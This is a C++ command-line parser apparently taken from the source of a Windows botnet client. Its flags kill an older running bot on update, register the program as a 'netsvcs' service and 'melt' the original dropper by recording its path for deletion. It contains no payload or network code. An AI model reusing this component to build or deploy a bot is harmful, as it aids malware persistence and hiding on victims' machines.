#include "main.h"
#include "cmdline.h"

CCmdLine::CCmdLine() { m_szCmdLine=NULL; }
CCmdLine::~CCmdLine() { if(m_szCmdLine) delete [] m_szCmdLine; }

void CCmdLine::Parse(const char *szCmdLine) {
	// Copy command line
	char *szCmdLineCopy; if(m_szCmdLine) delete [] m_szCmdLine;
	m_szCmdLine=new char[strlen(szCmdLine)+1]; strcpy(m_szCmdLine, szCmdLine);

	// Create defaults
#ifdef _DEBUG
	m_cConfig.bDebug=true; m_cConfig.iDebugLevel=10;
#else
	m_cConfig.bDebug=false; m_cConfig.iDebugLevel=0;
#endif // DEBUG

#ifdef DBGCONSOLE
	m_cConfig.bDebug=true; m_cConfig.iDebugLevel=10;
#endif // DBGCONSOLE

	m_cConfig.bUpdate=false;
	m_cConfig.bService=false;
	m_cConfig.bMeltServer=false;
	
	// Tokenize command line
	szCmdLineCopy=new char[strlen(m_szCmdLine)+1]; strcpy(szCmdLineCopy, m_szCmdLine);
	int iLoop=0; char *szCmdLineTok[256]; szCmdLineTok[0]=strtok(szCmdLineCopy, " ");
	for(iLoop=1;iLoop<256;iLoop++) szCmdLineTok[iLoop]=strtok(NULL, " ");

	// Scan command line tokens for params
	iLoop=0; while(szCmdLineTok[iLoop]) {
		if(!strcmp(szCmdLineTok[iLoop], "-debug")) { // Set the debug mode to enabled
#ifdef _DEBUG
			m_cConfig.bDebug=true;
		} else if(!strcmp(szCmdLineTok[iLoop], "-debuglevel")) { // Set the debug level to value
			if(szCmdLineTok[iLoop+1]) m_cConfig.iDebugLevel=atoi(szCmdLineTok[iLoop+1]); iLoop++;
#endif
		} else if(!strcmp(szCmdLineTok[iLoop], "-update")) { // Kill any old bot filename thats running
			m_cConfig.bUpdate=true;
		} else if(!strcmp(szCmdLineTok[iLoop], "-netsvcs")) { // Register service control handler
			m_cConfig.bService=true;
		} else if(!strcmp(szCmdLineTok[iLoop], "-bai")) { // Delete the old server
			CString sOldPath; char *pTemp=strstr(szCmdLine, "-bai"); if(pTemp) {
				sOldPath.Assign(pTemp); if(sOldPath.Token(1, " ", true).Compare("")) {
					m_cConfig.bMeltServer=true;
					strncpy(m_cConfig.szOldServer, sOldPath.Token(1, " ", true), sizeof(m_cConfig.szOldServer));
					iLoop++;
				}
			}
		}
		iLoop++; }

	// Zero debug level if not debugging
	if(!m_cConfig.bDebug) m_cConfig.iDebugLevel=0;
	// Lowest debug level as default
	if(!m_cConfig.iDebugLevel && m_cConfig.bDebug) m_cConfig.iDebugLevel=10;

#ifndef DBGCONSOLE
	m_cConfig.bDebug=0; m_cConfig.iDebugLevel=0;
#endif
}
